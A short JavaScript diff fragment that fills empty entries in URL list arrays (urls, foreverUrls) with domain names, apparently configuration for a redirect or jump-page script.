@@ -38,7 +38,7 @@ var emails = [
 
 var urls=[
 	'ysauvrws.com/', 
-	'/', 
+	'ysauvrws.com/', 
     '/',
 ];                                                                                                                  
 
@@ -57,7 +57,7 @@ var otherUrls = [
 var foreverUrls = [
 	  'https://nantongcgw.com',
 	JumpPage,
-	'',
+	'https://pkhhrpoed.cc',
 	
 ];
 var notices = [
